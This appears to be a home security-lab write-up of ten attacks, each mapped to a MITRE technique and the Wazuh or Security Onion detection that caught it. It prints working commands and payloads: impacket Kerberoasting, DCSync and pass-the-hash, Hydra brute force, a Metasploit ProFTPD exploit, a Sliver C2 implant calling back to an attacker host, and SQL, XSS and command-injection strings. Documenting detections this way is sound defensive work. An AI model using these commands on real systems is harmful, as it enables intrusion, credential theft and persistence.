Attacks & Detections

01Nmap ReconnaissanceT1046

Service and version scan across the entire victim subnet to map open ports and running software — the opening move of any intrusion.

$ nmap -sV 10.0.30.0/24
Target
Victim subnet (10.0.30.0/24)
Detected by
Security Onion
02KerberoastingT1558.003

Requests RC4-encrypted Kerberos service tickets (SPNs) so they can be cracked offline to recover service-account passwords.

$ impacket-GetUserSPNs siemlab.local/frankenstein:password123! -dc-ip 10.0.30.10 -request
Target
DC01 (10.0.30.10)
Detected by
Wazuh (Event 4769, RC4) + Security Onion
03DCSyncT1003.006

Abuses domain replication to impersonate a domain controller and dump every account's password hash — full domain compromise.

$ impacket-secretsdump siemlab.local/reaper:Password123!@10.0.30.10 -just-dc
Target
DC01 — dumped all domain hashes
Detected by
Auth events (Wazuh 92652)
04Pass-the-HashT1550.002

Authenticates with a stolen NTLM hash instead of a password, landing a remote shell as administrator without ever cracking it.

$ impacket-wmiexec -hashes <hash> siemlab/administrator@10.0.30.40
Target
Win11 (10.0.30.40) — shell as administrator
Detected by
Wazuh (92652, 67028) + Security Onion
05SQL InjectionT1190

Injects SQL into a web input to bypass authentication logic and then dump usernames and password hashes from the database.

payload ' OR '1'='1 payload ' UNION SELECT user, password FROM users #
Target
DVWA (10.0.30.80)
Detected by
Security Onion (SQLi signature) + Wazuh
06Cross-Site Scripting (XSS)T1059

Injects a script payload that executes in the browser of anyone who views the page — session theft and client-side compromise.

payload <script>alert('XSS')</script>
Target
DVWA (10.0.30.80)
Detected by
Security Onion + Wazuh
07Command InjectionT1059

Chains an operating-system command onto a web input field to run arbitrary commands on the host and read sensitive files.

payload 127.0.0.1; cat /etc/passwd
Target
DVWA (10.0.30.80)
Detected by
Security Onion
08Hydra Brute Force (RDP)T1110

Rapid, automated password guessing against Remote Desktop using the rockyou wordlist — the classic credential-stuffing brute force.

$ hydra -l UPCI -P /usr/share/wordlists/rockyou.txt rdp://10.0.30.40 -t 4
Target
Win11 (10.0.30.40)
Detected by
Wazuh (60122, 60204) + Security Onion
09ProFTPD ExploitT1210

Exploits the ProFTPD mod_copy vulnerability for remote code execution, dropping a shell as the web-server user.

msf6 > use exploit/unix/ftp/proftpd_modcopy_exec msf6 > run # target: Metasploitable (10.0.30.30)
Target
Metasploitable — shell as www-data
Detected by
Security Onion
10Sliver C2 Implant DeliveryT1071

Delivers a Sliver command-and-control beacon to the Windows 11 host to establish attacker persistence over the network.

sliver > generate --http 10.0.40.200 --save implant.exe # delivered to Win11
Target
Win11 (10.0.30.40)
Detected by
Security Onion (executable download)
